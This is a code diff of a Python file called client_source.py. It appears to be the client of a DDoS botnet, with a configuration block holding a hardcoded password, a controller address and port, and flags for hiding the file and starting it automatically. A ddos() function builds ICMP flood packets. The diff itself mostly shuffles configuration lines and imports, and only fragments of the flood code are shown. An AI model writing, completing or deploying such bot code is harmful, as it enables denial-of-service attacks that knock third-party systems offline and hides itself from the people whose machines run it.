@@ -1,13 +1,12 @@
-Password = ''
-mode = 'py'
+Password = 'oARbGV0Px66oNbhk'
+delay = 0.3
 address = '127.0.0.1'
 port = 6240
+mode = "py"
 Threads = 10
-delay = 0.3
-buffsize = 512
 Attribute_hide = True
 Self_starting = True
-#Testing code, will be delete in generation
+buffsize = 512
 # -*- coding:utf-8 -*-
 # @FileName  :client_source.py
 # @Author    :D0WE1L1N
@@ -15,7 +14,6 @@ Self_starting = True
 from socket import *
 from threading import Thread
 from random import _urandom, randint
-from time import sleep
 from os.path import abspath
 from sys import argv
 
@@ -98,7 +96,7 @@ def ddos(mode:str, address:str): #address : ip or url
     if mode == 'ICMPflood' or mode == 'Mix':
         from array import array
         from struct import pack, unpack
-        from time import time
+        from time import time, sleep
 
         header = pack('bbHHh', 8, 0, 0, 12345, 0)  # create header
         data = pack('d', time())  # create data, random time
@@ -205,4 +203,3 @@ if __name__ == '__main__':
     except Exception as e:
         print(e)
 
-# Blank line(will be delete)
